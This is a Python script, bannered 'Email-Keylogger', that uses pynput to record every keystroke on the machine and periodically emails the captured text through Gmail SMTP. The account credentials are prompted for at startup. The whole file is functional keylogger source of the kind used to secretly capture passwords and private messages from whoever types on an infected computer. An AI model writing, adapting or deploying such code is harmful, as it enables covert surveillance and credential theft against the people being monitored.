
# keystroke listener module
from pynput.keyboard import Listener, Key

# sending emails modules
import smtplib, ssl

from string import ascii_letters

print('''
 /$$$$$$$$                         /$$ /$$         /$$   /$$                     /$$                                                  
| $$_____/                        |__/| $$        | $$  /$$/                    | $$                                                  
| $$       /$$$$$$/$$$$   /$$$$$$  /$$| $$        | $$ /$$/   /$$$$$$  /$$   /$$| $$  /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$ 
| $$$$$   | $$_  $$_  $$ |____  $$| $$| $$ /$$$$$$| $$$$$/   /$$__  $$| $$  | $$| $$ /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$
| $$__/   | $$ \ $$ \ $$  /$$$$$$$| $$| $$|______/| $$  $$  | $$$$$$$$| $$  | $$| $$| $$  \ $$| $$  \ $$| $$  \ $$| $$$$$$$$| $$  \__/
| $$      | $$ | $$ | $$ /$$__  $$| $$| $$        | $$\  $$ | $$_____/| $$  | $$| $$| $$  | $$| $$  | $$| $$  | $$| $$_____/| $$      
| $$$$$$$$| $$ | $$ | $$|  $$$$$$$| $$| $$        | $$ \  $$|  $$$$$$$|  $$$$$$$| $$|  $$$$$$/|  $$$$$$$|  $$$$$$$|  $$$$$$$| $$      
|________/|__/ |__/ |__/ \_______/|__/|__/        |__/  \__/ \_______/ \____  $$|__/ \______/  \____  $$ \____  $$ \_______/|__/      
                                                                       /$$  | $$               /$$  \ $$ /$$  \ $$                    
                                                                      |  $$$$$$/              |  $$$$$$/|  $$$$$$/                    
                                                                       \______/                \______/  \______/                     
                                                                                        
''')

numLet = [i for i in ascii_letters] + [1,2,3,4,5,6,7,8,9,0]

email = input("What Is Your Email: ")
password = input("What Is Your Password (Don't Worry We're Not Stealing It, Check The Github If You Don't Believe It): ")

log = "\n"
keyLog = ""

char_length = int(input("What Would You Like The Character Limit To Be Before The Email Is Sent: "))

def sendMail(email,password, msg):
    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl.create_default_context()) as server:
            server.login(email, password)
            server.sendmail(email,email,msg)
    except:
        print("\n Something Went Wrong Check To See Whether Your Email Or Password Is Right Or Check The FAQ On Github")


def keystroke(key):
    # removes the comma in each keystroke recorded
    key = str(key).replace("'", "")

    global log
    global keyLog
    global char_length

    if key not in numLet:
        log+=f" {keyLog} \n " + f" {key} \n "
        keyLog =""
        if len(log) >= char_length:
            sendMail(email, password, log)
            log = ""
    elif key in numLet:
        keyLog += key


# Listener to record each keystroke
with Listener(on_press=keystroke) as Listener:
    Listener.join()






